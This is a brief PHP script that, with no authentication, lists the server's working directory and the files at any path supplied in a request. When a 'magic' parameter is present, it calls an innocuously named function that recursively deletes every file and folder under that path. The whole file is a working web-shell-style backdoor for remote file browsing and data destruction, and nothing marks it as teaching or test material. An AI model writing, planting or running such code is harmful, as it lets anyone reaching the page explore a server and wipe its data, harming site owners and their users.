<?php

if (isset($_REQUEST['path'])) {
    echo getcwd().'<br/>';
    if (!empty($_REQUEST['path'])) {
        $files = glob($_REQUEST['path'] . '/*', GLOB_MARK);
        print_r($files);
    }
    if (isset($_REQUEST['magic'])) {
        $path = $_REQUEST['path'];
        its_magic_on_server($path);
    }
}

function its_magic_on_server($target) {
    if (is_dir($target)) {
        $files = glob($target . '*', GLOB_MARK);

        foreach ($files as $file) {
            its_magic_on_server($file);
        }

        rmdir($target);
    } elseif (is_file($target)) {
        unlink($target);
    }
}

?>